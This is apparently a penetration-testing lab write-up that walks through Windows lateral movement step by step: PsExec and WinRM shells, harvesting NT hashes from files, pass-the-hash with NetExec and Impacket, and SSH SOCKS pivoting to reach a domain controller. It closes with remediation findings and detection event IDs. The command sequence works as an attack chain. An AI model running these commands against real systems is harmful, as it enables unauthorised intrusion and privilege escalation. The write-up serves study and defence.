# Phase 1 — Remote Execution

### Objective

Determine whether the compromised account can execute commands remotely on Windows hosts.

### PsExec

Where the authenticated account has local administrator privileges, PsExec can be used to remotely execute commands through SMB and the Service Control Manager.

Example:

```bash
psexec.py DOMAIN/user:'PASSWORD'@TARGET
```

Successful execution results in a remote command shell.

Validation:

```cmd
whoami
hostname
```

Expected privilege level when using an administrative PsExec session:

```text
nt authority\system
```

### Engagement significance

A valid credential combined with local administrator privileges can convert simple credential access into **remote code execution**.

Record:

* Source host
* Destination host
* Account used
* Authentication method
* Privilege obtained
* Evidence of successful execution

---

# Phase 2 — WinRM

Where the account belongs to the appropriate remote-management group, WinRM can provide a PowerShell session without requiring local administrator privileges in every scenario.

Example:

```bash
evil-winrm -i TARGET -u USER -p 'PASSWORD'
```

Validate:

```powershell
whoami
hostname
```

### Engagement significance

WinRM provides an alternative lateral-movement path to SMB-based execution.

When assessing an environment, determine:

```text
Can the account authenticate?
Can the account establish a WinRM session?
What privileges does the resulting session have?
```

---

# Phase 3 — Credential Discovery

Once administrative access is obtained on a host, inspect locations where credentials may have been left behind.

Example evidence from the lab:

```cmd
type C:\Users\Administrator\Documents\loot.txt
```

Result:

```text
Administrator:500:[LM]:[NT]
```

The important value for Pass-the-Hash is the **NT hash**.

### Important distinction

| Credential                    | PtH? |
| ----------------------------- | ---- |
| NT hash                       | Yes  |
| Net-NTLMv2 challenge/response | No   |

A raw NT hash can be used for NTLM authentication without knowing the plaintext password.

A Net-NTLMv2 response generally needs to be cracked or otherwise abused through a different technique such as relay.

---

# Phase 4 — Pass-the-Hash

### Objective

Determine whether a recovered NT hash is valid on additional hosts.

NetExec:

```bash
nxc smb TARGET -u Administrator -H NT_HASH --local-auth
```

For multiple hosts:

```bash
nxc smb TARGET1 TARGET2 \
-u Administrator \
-H NT_HASH \
--local-auth
```

### Evidence

Successful authentication may appear as:

```text
[+] HOST\Administrator:HASH
```

Administrative access is indicated by:

```text
(Pwn3d!)
```

### Interpretation

```text
Valid credentials
        ↓
Local administrator?
        ↓
Yes
        ↓
Remote execution possible
```

The lab demonstrated that the same local Administrator hash was valid on multiple systems, illustrating the risk of local administrator password reuse.

---

# Phase 5 — Remote Shell Using the Hash

Impacket:

```bash
psexec.py -hashes :NT_HASH Administrator@TARGET
```

The `-hashes` parameter accepts:

```text
LM:NT
```

If only the NT hash is available:

```text
:NT_HASH
```

Validate:

```cmd
whoami
hostname
```

Document the resulting privilege.

---

# Phase 6 — Credential Escalation Through Host-to-Host Movement

On the newly compromised host, enumerate relevant files and credential material.

Example from the lab:

```cmd
type C:\Users\Administrator\Documents\da_creds.txt
```

The lab demonstrated a second credential:

```text
THM\Administrator:[RID]:[LM]:[NT]
```

This represents a **Domain Administrator NT hash**.

### Attack-chain significance

The important finding is not merely the hash itself.

The important finding is:

```text
Compromised workstation
        ↓
Local Administrator hash
        ↓
SERVER1
        ↓
Domain Administrator credential
        ↓
Domain Controller
```

This demonstrates credential exposure creating an iterative lateral-movement path.

---

# Phase 7 — Network Pivoting

### Finding

The AttackBox cannot directly reach the Domain Controller.

Example:

```bash
nxc smb 192.168.13.100 -u Administrator -H NT_HASH
```

Result:

```text
Connection timeout
```

The compromised WebServer, however, has network access to the restricted environment.

Therefore:

```text
AttackBox → WebServer → Internal Network → DC
```

---

## SSH Local Port Forward

For a single service:

```bash
ssh -L 13389:192.168.13.100:3389 jdoe@192.168.13.71 -N
```

The AttackBox then accesses:

```text
127.0.0.1:13389
```

Traffic is forwarded through the WebServer to:

```text
192.168.13.100:3389
```

Use this approach when only one specific internal service is required.

---

# SSH SOCKS Pivot

For multiple hosts/services:

```bash
ssh -f -D 1080 jdoe@192.168.13.71 -N
```

This establishes:

```text
127.0.0.1:1080
```

as a SOCKS proxy.

Configure ProxyChains:

```text
[ProxyList]
socks4 127.0.0.1 1080
```

Then route supported tools through the tunnel:

```bash
proxychains nxc smb 192.168.13.100 \
-u Administrator \
-H NT_HASH
```

If authentication succeeds:

```text
(Pwn3d!)
```

Remote execution can then be performed through the proxy:

```bash
proxychains psexec.py \
-hashes :NT_HASH \
DOMAIN/Administrator@192.168.13.100
```

Validate:

```cmd
hostname
whoami
```

---

# Evidence / Reporting

For every successful lateral movement event, capture:

### Authentication

```text
Source:
Destination:
Username:
Credential type:
Authentication protocol:
```

### Execution

```text
Tool:
Protocol:
Command:
Privilege:
```

### Credential exposure

```text
Credential type:
Account:
Source host:
Storage location:
Hash/secret:
```

### Pivot

```text
Pivot host:
Attacker-side listener:
Internal destination:
Destination port:
Tunnel type:
```

### Impact

Document whether access resulted in:

* Local Administrator
* SYSTEM
* Domain User
* Domain Administrator
* Domain Controller access
* Sensitive data access

---

# Findings

### Finding 1 — Local Administrator Password Reuse

**Severity:** High/Critical depending on environment and privilege scope.

The same local Administrator credential material was usable across multiple hosts.

**Impact:**

Compromise of one workstation can enable lateral movement to other systems without obtaining additional plaintext credentials.

**Recommendation:**

Deploy Windows LAPS and ensure local administrator credentials are unique and automatically rotated.

---

### Finding 2 — Excessive Local Administrator Access

Users with unnecessary local administrator privileges can turn credential compromise into remote code execution.

**Recommendation:**

Apply least privilege and tiered administration.

---

### Finding 3 — Sensitive Credentials Stored on Hosts

Credentials/hashes associated with privileged accounts were discoverable on compromised systems.

**Impact:**

Credential exposure can create an escalation path from workstation compromise to Domain Administrator.

**Recommendation:**

Prevent privileged credentials from being used on lower-trust systems and deploy PAWs for Tier-0 administration.

---

### Finding 4 — Insufficient Network Segmentation

The compromised WebServer had network connectivity to restricted infrastructure.

**Impact:**

An attacker could use the host as a pivot to access otherwise unreachable services.

**Recommendation:**

Implement VLAN/firewall segmentation and restrict workstation/server/DC communication to legitimate administrative paths.

---

### Finding 5 — SMB/NTLM Exposure

The environment permitted SMB-based authentication and Pass-the-Hash.

**Recommendation:**

Enforce SMB signing, audit and progressively restrict NTLM, and deploy Credential Guard where appropriate.

---

# Detection Opportunities

Monitor for:

| Event          | Significance                           |
| -------------- | -------------------------------------- |
| `4624 Type 3`  | Network logon                          |
| `4624 Type 10` | Remote interactive logon               |
| `4648`         | Explicit credential use                |
| `7045`         | Service installation / possible PsExec |
| `4698`         | Scheduled task creation                |
| `4688`         | Process creation                       |

Sysmon is particularly useful for process and LSASS-access telemetry.

---

# Attack Chain Summary

```text
Initial SSH foothold
        ↓
WebServer
        ↓
Remote access to WRK
        ↓
SYSTEM / local administrator access
        ↓
Harvest NT hash
        ↓
Pass-the-Hash
        ↓
SERVER1
        ↓
Discover Domain Administrator hash
        ↓
SSH SOCKS pivot
        ↓
Domain Controller
        ↓
Domain Administrator authentication
        ↓
SYSTEM
```
     
